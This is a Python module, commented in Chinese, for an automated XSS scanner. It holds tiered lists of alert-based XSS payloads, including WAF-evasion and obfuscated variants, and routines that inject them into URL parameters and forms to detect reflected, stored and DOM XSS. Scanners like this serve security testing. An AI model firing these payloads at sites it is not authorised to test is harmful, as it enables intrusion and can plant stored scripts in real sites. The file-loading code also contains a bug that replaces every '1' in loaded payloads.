#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
XSS扫描器模块，负责扫描XSS漏洞
"""

import re
import logging
import random
import string
import time
import base64
from urllib.parse import urlparse, urlencode, parse_qsl, unquote
from bs4 import BeautifulSoup

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.common.exceptions import TimeoutException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

from xss_scanner.utils.tech_detector import TechDetector

logger = logging.getLogger('xss_scanner')

class XSSScanner:
    """XSS扫描器类，负责扫描XSS漏洞"""
    
    def __init__(self, http_client, payload_level=2, use_browser=False):
        """
        初始化XSS扫描器
        
        Args:
            http_client: HTTP客户端对象
            payload_level: Payload复杂度级别，1-基础，2-标准，3-高级
            use_browser: 是否使用真实浏览器检测
        """
        self.http_client = http_client
        self.payload_level = payload_level
        self.use_browser = use_browser and SELENIUM_AVAILABLE
        self.driver = None
        
        # 初始化技术检测器
        self.tech_detector = TechDetector()
        
        # 存储检测到的技术信息
        self.tech_info = {
            'frontend': [],
            'backend': [],
            'server': [],
            'waf': []
        }
        
        # 初始化浏览器
        if self.use_browser:
            self._init_browser()
            
        # 随机生成的标记，用于检测XSS漏洞
        self.xss_mark = self._generate_random_string(8)
        
        # 加载XSS Payload
        self.payloads = self._load_payloads()
        
        # 加载WAF绕过Payload
        self.waf_bypass_payloads = self._load_payloads_from_file('xss_waf_bypass.txt')
    
    def _init_browser(self):
        """初始化浏览器"""
        if not SELENIUM_AVAILABLE:
            logger.warning("未安装Selenium，无法使用浏览器功能")
            self.use_browser = False
            return
            
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-notifications')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(10)
            logger.info("浏览器初始化成功")
        except Exception as e:
            logger.error(f"浏览器初始化失败: {str(e)}")
            self.use_browser = False
    
    def _load_payloads(self):
        """
        加载XSS Payload
        
        Returns:
            list: XSS Payload列表
        """
        # 尝试从文件加载Payload
        filename = f"xss_level{self.payload_level}.txt"
        file_payloads = self._load_payloads_from_file(filename)
        
        if file_payloads:
            return file_payloads
        
        # 如果文件加载失败，则使用内置的Payload
        # 基础XSS Payload，适用于所有场景
        basic_payloads = [
            f"<script>alert('{self.xss_mark}')</script>",
            f"<img src=x onerror=alert('{self.xss_mark}')>",
            f"<svg onload=alert('{self.xss_mark}')>",
            f"<body onload=alert('{self.xss_mark}')>",
            f"<iframe onload=alert('{self.xss_mark}')></iframe>",
            f"javascript:alert('{self.xss_mark}')",
            f"<input autofocus onfocus=alert('{self.xss_mark}')>",
            f"<select autofocus onfocus=alert('{self.xss_mark}')>",
            f"<textarea autofocus onfocus=alert('{self.xss_mark}')>",
            f"<keygen autofocus onfocus=alert('{self.xss_mark}')>",
            f"<video><source onerror=alert('{self.xss_mark}')>",
            f"<audio src=x onerror=alert('{self.xss_mark}')>",
            f"><script>alert('{self.xss_mark}')</script>",
            f"\"><script>alert('{self.xss_mark}')</script>",
            f"'><script>alert('{self.xss_mark}')</script>",
            f"><img src=x onerror=alert('{self.xss_mark}')>"
        ]
        
        # 标准XSS Payload，用于绕过简单的防护
        standard_payloads = [
            f"<script>alert(String.fromCharCode(88,83,83,77,65,82,75))</script>".replace("XSSMARK", self.xss_mark),
            f"<img src=x oneonerrorrror=alert('{self.xss_mark}')>",
            f"<sCRipT>alert('{self.xss_mark}')</sCriPt>",
            f"<script/x>alert('{self.xss_mark}')</script>",
            f"<script ~~~>alert('{self.xss_mark}')</script ~~~>",
            f"<script>setTimeout('alert(\\'{self.xss_mark}\\')',0)</script>",
            f"<svg/onload=alert('{self.xss_mark}')>",
            f"<svg><script>alert('{self.xss_mark}')</script>",
            f"<svg><animate onbegin=alert('{self.xss_mark}') attributeName=x dur=1s>",
            f"<svg><a><animate attributeName=href values=javascript:alert('{self.xss_mark}') /><text x=20 y=20>Click Me</text></a>",
            f"<svg><script xlink:href=data:,alert('{self.xss_mark}') />",
            f"<math><maction actiontype=statusline xlink:href=javascript:alert('{self.xss_mark}')>Click</maction></math>",
            f"<iframe src=javascript:alert('{self.xss_mark}')></iframe>",
            f"<object data=javascript:alert('{self.xss_mark}')></object>",
            f"<embed src=javascript:alert('{self.xss_mark}')></embed>",
            f"<link rel=import href=data:text/html;base64,{base64.b64encode(f'<script>alert(\'{self.xss_mark}\')</script>'.encode()).decode()}>",
            f"<x contenteditable onblur=alert('{self.xss_mark}')>lose focus!</x>",
            f"<style>@keyframes x{{}}*{{}}50%{{background:url('javascript:alert(\"{self.xss_mark}\")')}}</style><div style=animation-name:x>",
            f"<sVg OnLoAd=alert('{self.xss_mark}')>",
            f"<img src=`x`onerror=alert('{self.xss_mark}')>",
            f"<img src='x'onerror=alert('{self.xss_mark}')>",
            f"<img src=\"x\"onerror=alert('{self.xss_mark}')>"
        ]
        
        # 高级XSS Payload，用于绕过复杂的防护
        advanced_payloads = [
            f"<script>eval(atob('{base64.b64encode(f'alert(\'{self.xss_mark}\')'.encode()).decode()}'))</script>",
            f"<script>setTimeout(()=>{{eval(atob('{base64.b64encode(f'alert(\'{self.xss_mark}\')'.encode()).decode()}'))}})</script>",
            f"<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27{self.xss_mark}\\x27\\x29')</script>",
            f"<script>window['al'+'ert']('{self.xss_mark}')</script>",
            f"<script>var a='al',b='ert';window[a+b]('{self.xss_mark}')</script>",
            f"<svg><script>123<1>alert('{self.xss_mark}')</script>",
            f"<svg><script>{{\\n}}alert('{self.xss_mark}')</script>",
            f"<a href=javascript&colon;alert&lpar;'{self.xss_mark}'&rpar;>Click</a>",
            f"<svg><animate onbegin=alert('{self.xss_mark}') attributeName=x></svg>",
            f"<div style=width:1000px;overflow:hidden;>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<img src=x onerror=alert('{self.xss_mark}')>",
            f"<img src=1 onerror=alert({self._to_js_string(self.xss_mark)})>",
            f"<script>onerror=alert;throw'{self.xss_mark}';</script>",
            f"<script>[].filter.call(1,alert,'{self.xss_mark}')</script>",
            f"<script>Object.defineProperties(window, {{get onerror(){{return {{handleEvent: function(){{alert('{self.xss_mark}');}}}};}}}});throw 'test';</script>",
            f"<script>({{}}).constructor.constructor('alert(\\'{self.xss_mark}\\')')();</script>",
            f"<script>String.prototype.replace.call('xss','ss',(_,__)=>eval('aler'+'t(`{self.xss_mark}`)'))</script>",
            f"<script>location='javascript:alert(\\'{self.xss_mark}\\');</script>",
            f"<iframe srcdoc=\"<script>parent.alert('{self.xss_mark}')</script>\"></iframe>",
            f"<script>[]['\\\140cons\\\140'+'tru\\\143tor']('\\\141\\\154\\\145\\\162\\\164\\\50\\\47{self.xss_mark}\\\47\\\51')();</script>",
            f"<form id='xss'><input name='action' value='alert(\"{self.xss_mark}\")'></form><svg><use href='#xss' /></svg>",
            f"<img src=x:alert('{self.xss_mark}') onerror=eval(src)>",
            f"<script src='data:text/javascript,alert(\"{self.xss_mark}\")'></script>",
            f"<object data='data:text/html;base64,{base64.b64encode(f"<script>alert('{self.xss_mark}')</script>".encode()).decode()}'></object>",
            f"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('{self.xss_mark}')\">",
            f"<iframe src=\"javascript:alert('{self.xss_mark}')\"></iframe>",
            f"<form><button formaction=javascript:alert('{self.xss_mark}')>click</button></form>"
        ]
        
        # 根据Payload级别返回对应的Payload列表
        if self.payload_level == 1:
            return basic_payloads
        elif self.payload_level == 2:
            return basic_payloads + standard_payloads
        else:
            return basic_payloads + standard_payloads + advanced_payloads
    
    def _load_payloads_from_file(self, filename, default_payloads=None):
        """
        从文件中加载Payload
        
        Args:
            filename: Payload文件名
            default_payloads: 默认Payload列表
            
        Returns:
            list: Payload列表
        """
        import os
        
        # 获取当前模块所在目录
        current_dir = os.path.dirname(os.path.abspath(__file__))
        
        # 构建Payload文件路径
        payloads_dir = os.path.join(os.path.dirname(os.path.dirname(current_dir)), 'payloads', 'xss')
        
        # 如果目录不存在，则创建
        if not os.path.exists(payloads_dir):
            try:
                os.makedirs(payloads_dir)
            except Exception as e:
                logger.error(f"创建Payload目录失败: {str(e)}")
                return default_payloads
        
        payload_file = os.path.join(payloads_dir, filename)
        
        # 如果文件不存在，则返回默认Payload
        if not os.path.exists(payload_file):
            logger.warning(f"Payload文件不存在: {payload_file}")
            return default_payloads
        
        try:
            # 读取Payload文件
            payloads = []
            with open(payload_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    # 忽略空行和注释
                    if not line or line.startswith('#'):
                        continue
                    # 替换Payload中的占位符
                    line = line.replace('XSS_MARK', self.xss_mark)
                    line = line.replace('XSSMARK', self.xss_mark)
                    line = line.replace('1', self.xss_mark)
                    payloads.append(line)
            
            logger.info(f"从{payload_file}加载了{len(payloads)}个Payload")
            return payloads
        except Exception as e:
            logger.error(f"加载Payload文件失败: {str(e)}")
            return default_payloads
    
    def scan_form(self, url, form, field):
        """
        扫描表单中的XSS漏洞
        
        Args:
            url: 页面URL
            form: 表单信息
            field: 字段信息
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        if not field.get('name'):
            return None
            
        logger.debug(f"扫描表单字段: {field.get('name')} @ {url}")
        
        # 获取表单提交URL
        action_url = form['action'] if form['action'] else url
        
        # 获取表单方法
        method = form['method'].upper()
        
        # 首先检测目标技术栈
        self._detect_technology(url)
        
        # 获取针对特定WAF的绕过Payload
        waf_payloads = self._get_waf_bypass_payloads()
        
        # 合并标准Payload和WAF绕过Payload
        all_payloads = self.payloads + waf_payloads
        
        # 构建表单数据
        for payload in all_payloads:
            form_data = {}
            
            # 填充所有字段
            for f in form.get('fields', []):
                if f.get('name'):
                    # 如果是目标字段，则使用Payload
                    if f['name'] == field['name']:
                        form_data[f['name']] = payload
                    else:
                        # 否则使用默认值
                        form_data[f['name']] = f.get('value', '')
            
            # 提交表单
            try:
                logger.debug(f"测试Payload: {payload}")
                
                if method == 'POST':
                    response = self.http_client.post(action_url, data=form_data)
                else:
                    response = self.http_client.get(action_url, params=form_data)
                    
                if not response:
                    continue
                    
                # 检查响应中是否包含Payload
                if self._check_xss_in_response(response, payload):
                    return {
                        'type': 'XSS',
                        'subtype': 'Reflected XSS',
                        'url': url,
                        'form_action': action_url,
                        'form_method': method,
                        'parameter': field['name'],
                        'payload': payload,
                        'severity': '高',
                        'description': f"在表单字段'{field['name']}'中发现反射型XSS漏洞",
                        'details': f"表单提交到{action_url}的{field['name']}字段存在XSS漏洞，可以执行任意JavaScript代码",
                        'recommendation': "对用户输入进行过滤和编码，使用安全的前端框架，启用CSP策略"
                    }
            except Exception as e:
                logger.error(f"扫描表单时发生错误: {str(e)}")
                
        return None
    
    def scan_parameter(self, url, param):
        """
        扫描URL参数中的XSS漏洞
        
        Args:
            url: 页面URL
            param: 参数名
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        logger.debug(f"扫描URL参数: {param} @ {url}")
        
        # 解析URL
        parsed_url = urlparse(url)
        
        # 获取查询参数
        query_params = dict(parse_qsl(parsed_url.query))
        
        # 如果参数不存在，则添加
        if param not in query_params:
            query_params[param] = ""
            
        # 构建基础URL
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # 首先检测目标技术栈
        self._detect_technology(url)
        
        # 获取针对特定WAF的绕过Payload
        waf_payloads = self._get_waf_bypass_payloads()
        
        # 合并标准Payload和WAF绕过Payload
        all_payloads = self.payloads + waf_payloads
        
        # 测试每个Payload
        for payload in all_payloads:
            # 构建新的查询参数
            new_params = query_params.copy()
            new_params[param] = payload
            
            # 构建测试URL
            query_string = urlencode(new_params)
            test_url = f"{base_url}?{query_string}"
            
            try:
                logger.debug(f"测试Payload: {payload}")
                
                # 发送请求
                response = self.http_client.get(test_url)
                if not response:
                    continue
                    
                # 检查响应中是否包含Payload
                if self._check_xss_in_response(response, payload):
                    return {
                        'type': 'XSS',
                        'subtype': 'Reflected XSS',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'severity': '高',
                        'description': f"在URL参数'{param}'中发现反射型XSS漏洞",
                        'details': f"URL参数{param}存在XSS漏洞，可以执行任意JavaScript代码",
                        'recommendation': "对用户输入进行过滤和编码，使用安全的前端框架，启用CSP策略"
                    }
            except Exception as e:
                logger.error(f"扫描URL参数时发生错误: {str(e)}")
                
        return None
    
    def scan_dom(self, url):
        """
        扫描DOM型XSS漏洞
        
        Args:
            url: 页面URL
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        if not self.use_browser or not self.driver:
            logger.debug("浏览器未初始化，无法扫描DOM型XSS")
            return None
            
        logger.debug(f"扫描DOM型XSS: {url}")
        
        vulnerable_sources = [
            'document.URL', 'document.documentURI', 'document.URLUnencoded', 'document.baseURI',
            'location', 'location.href', 'location.search', 'location.hash', 'location.pathname',
            'document.referrer', 'window.name', 'history.pushState', 'history.replaceState',
            'localStorage', 'sessionStorage', 'document.cookie', 'document.write'
        ]
        
        try:
            # 加载页面
            self.driver.get(url)
            
            # 检查页面中是否存在可能的DOM XSS
            for source in vulnerable_sources:
                # 执行JavaScript检查
                result = self.driver.execute_script(f"""
                    var code = document.documentElement.innerHTML;
                    if (code.indexOf("{source}") !== -1) {{
                        return true;
                    }}
                    return false;
                """)
                
                if result:
                    return {
                        'type': 'XSS',
                        'subtype': 'DOM XSS',
                        'url': url,
                        'parameter': source,
                        'payload': None,
                        'severity': '高',
                        'description': f"可能存在DOM型XSS漏洞，检测到敏感源'{source}'",
                        'details': f"页面中使用了可能导致DOM型XSS的源'{source}'，需要进一步手动验证",
                        'recommendation': "使用安全的JavaScript API，避免直接操作DOM，使用安全的前端框架，启用CSP策略"
                    }
        except TimeoutException:
            logger.warning(f"页面加载超时: {url}")
        except WebDriverException as e:
            logger.error(f"浏览器发生错误: {str(e)}")
        except Exception as e:
            logger.error(f"扫描DOM型XSS时发生错误: {str(e)}")
            
        return None
    
    def scan_stored_xss(self, url, form, field, verify_url):
        """
        扫描存储型XSS漏洞
        
        Args:
            url: 提交表单的URL
            form: 表单信息
            field: 字段信息
            verify_url: 验证URL
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        if not field.get('name'):
            return None
            
        logger.debug(f"扫描存储型XSS: {field.get('name')} @ {url}, 验证URL: {verify_url}")
        
        # 获取表单提交URL
        action_url = form['action'] if form['action'] else url
        
        # 获取表单方法
        method = form['method'].upper()
        
        # 首先检测目标技术栈
        self._detect_technology(url)
        
        # 获取针对特定WAF的绕过Payload
        waf_payloads = self._get_waf_bypass_payloads()
        
        # 合并标准Payload和WAF绕过Payload
        all_payloads = self.payloads + waf_payloads
        
        # 构建表单数据
        for payload in all_payloads:
            form_data = {}
            
            # 填充所有字段
            for f in form.get('fields', []):
                if f.get('name'):
                    # 如果是目标字段，则使用Payload
                    if f['name'] == field['name']:
                        form_data[f['name']] = payload
                    else:
                        # 否则使用默认值
                        form_data[f['name']] = f.get('value', '')
            
            # 提交表单
            try:
                logger.debug(f"测试Payload: {payload}")
                
                if method == 'POST':
                    response = self.http_client.post(action_url, data=form_data)
                else:
                    response = self.http_client.get(action_url, params=form_data)
                    
                if not response:
                    continue
                    
                # 检查表单提交后，访问验证URL是否包含Payload
                verify_response = self.http_client.get(verify_url)
                if not verify_response:
                    continue
                    
                # 检查响应中是否包含Payload
                if self._check_xss_in_response(verify_response, payload):
                    return {
                        'type': 'XSS',
                        'subtype': 'Stored XSS',
                        'url': url,
                        'form_action': action_url,
                        'form_method': method,
                        'parameter': field['name'],
                        'payload': payload,
                        'severity': '高',
                        'description': f"在表单字段'{field['name']}'中发现存储型XSS漏洞",
                        'details': f"表单提交到{action_url}的{field['name']}字段存在存储型XSS漏洞，可以执行任意JavaScript代码",
                        'recommendation': "对用户输入进行过滤和编码，使用安全的前端框架，启用CSP策略"
                    }
            except Exception as e:
                logger.error(f"扫描存储型XSS时发生错误: {str(e)}")
                
        return None
    
    def _detect_technology(self, url):
        """
        检测网站使用的技术栈
        
        Args:
            url: 目标URL
        """
        try:
            # 发送请求
            response = self.http_client.get(url)
            if not response:
                return
                
            # 使用技术检测器检测
            self.tech_info = self.tech_detector.detect(response)
            
            frameworks = ", ".join(self.tech_info.get('frontend', []))
            backends = ", ".join(self.tech_info.get('backend', []))
            servers = ", ".join(self.tech_info.get('server', []))
            wafs = ", ".join(self.tech_info.get('waf', []))
            
            if frameworks:
                logger.info(f"检测到前端框架: {frameworks}")
            if backends:
                logger.info(f"检测到后端技术: {backends}")
            if servers:
                logger.info(f"检测到服务器: {servers}")
            if wafs:
                logger.info(f"检测到WAF: {wafs}")
                
                # 获取WAF绕过技术
                bypass_techniques = self.tech_detector.get_waf_bypass_techniques(self.tech_info.get('waf', []))
                for waf, techniques in bypass_techniques.items():
                    logger.info(f"可能的{waf} WAF绕过技术:")
                    for i, technique in enumerate(techniques, 1):
                        logger.info(f"  {i}. {technique}")
        except Exception as e:
            logger.error(f"检测技术栈时发生错误: {str(e)}")
    
    def _get_waf_bypass_payloads(self):
        """
        根据检测到的WAF，获取对应的绕过Payload
        
        Returns:
            list: 绕过Payload列表
        """
        if not self.tech_info.get('waf'):
            return []
            
        # 使用WAF绕过专用的Payload
        if self.waf_bypass_payloads:
            return self.waf_bypass_payloads
            
        # 如果没有预加载的WAF绕过Payload，则返回空列表
        return []
    
    def _check_xss_in_response(self, response, payload):
        """
        检查响应中是否包含XSS Payload
        
        Args:
            response: 响应对象
            payload: XSS Payload
            
        Returns:
            bool: 是否包含Payload
        """
        # 如果响应为空，则返回False
        if not response or not response.text:
            return False
            
        # 检查响应中是否包含XSS标记
        if self.xss_mark in response.text:
            return True
            
        # 解析响应内容
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # 检查是否存在alert弹窗（仅在使用浏览器时有效）
            if self.use_browser and self.driver:
                try:
                    self.driver.get("data:text/html;charset=utf-8," + response.text)
                    time.sleep(1)
                    
                    # 检查是否有弹窗
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    alert.dismiss()
                    
                    if self.xss_mark in alert_text:
                        return True
                except:
                    pass
            
            # 检查特定标签
            for tag_name in ['script', 'img', 'svg', 'iframe', 'body', 'input', 'textarea', 'video', 'audio']:
                tags = soup.find_all(tag_name)
                for tag in tags:
                    tag_str = str(tag)
                    if self.xss_mark in tag_str:
                        return True
                        
            # 检查特定属性
            for tag in soup.find_all():
                for attr in ['src', 'onerror', 'onload', 'onfocus', 'onblur', 'onclick', 'onmouseover']:
                    if tag.has_attr(attr) and self.xss_mark in tag[attr]:
                        return True
        except Exception as e:
            logger.error(f"检查XSS时发生错误: {str(e)}")
            
        return False
    
    def _generate_random_string(self, length=8):
        """
        生成随机字符串
        
        Args:
            length: 字符串长度
            
        Returns:
            str: 随机字符串
        """
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def _to_js_string(self, s):
        """
        将字符串转换为JavaScript字符串
        
        Args:
            s: 字符串
            
        Returns:
            str: JavaScript字符串
        """
        js_escape_table = {
            '\\': '\\\\',
            '\r': '\\r',
            '\n': '\\n',
            '"': '\\"',
            "'": "\\'"
        }
        
        result = ''
        for c in s:
            if c in js_escape_table:
                result += js_escape_table[c]
            else:
                result += c
                
        return f"'{result}'"
    
    def close(self):
        """关闭资源"""
        if self.use_browser and self.driver:
            try:
                self.driver.quit()
            except:
                pass
            
    def can_scan_form(self):
        """是否可以扫描表单"""
        return True
    
    def can_scan_params(self):
        """是否可以扫描URL参数"""
        return True
        
    def get_tech_info(self):
        """获取技术检测信息"""
        return self.tech_info 